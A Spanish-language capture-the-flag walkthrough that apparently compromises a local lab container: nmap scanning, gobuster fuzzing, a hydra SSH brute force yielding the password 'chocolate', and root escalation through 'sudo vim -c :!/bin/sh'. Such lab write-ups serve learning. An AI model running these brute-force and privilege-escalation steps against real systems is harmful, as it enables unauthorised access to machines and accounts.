Primero de todo realizaremos un escaneo de la ip para ver que puertos están abiertos y que servicios tiene asociados.

```
sudo nmap -sV -sC --min-rate 7000 -p- -Pn 172.17.0.2 -oN escaneo
```

<img src="Pasted image 20240426135632.png">

Vemos que está corriendo una web, vamo a ver que esconde.
<img src="Pasted image 20240426135805.png">

Vemos que está la página de apache por defecto, por lo tanto procediremos a realizar un fuzzing de la web.
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt
```

<img src="Pasted image 20240426140646.png">

Abriremos la pagina secrt.php para ver que esconde.
<img src="Pasted image 20240426140835.png">

Vemos que nos está dando el usuario así que podemos intentar un ataque de fuerza bruta para poder entrar vía ssh.

```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

<img src="Pasted image 20240426141036.png">

Vemos que hemos obtenido las credenciales, ahora entraremos vía ssh.

```
ssh mario@172.17.0.2
password: chocolate
```

<img src="Pasted image 20240426141227.png">

Ya estamos dentro, ahor avamos a intentar acceder al usuario administrador (root).

```
sudo -l
password: chocolate
```

<img src="Pasted image 20240426141357.png">

Vemos que nos muestra el binario vim que tiene permisos de administrador, por lo tanto, vamos a intentar usarlo para escalar privilegios.

```
sudo /usr/bin/vim -c ':!/bin/sh'
```

```
whoami
```

<img src="Pasted image 20240426141740.png">
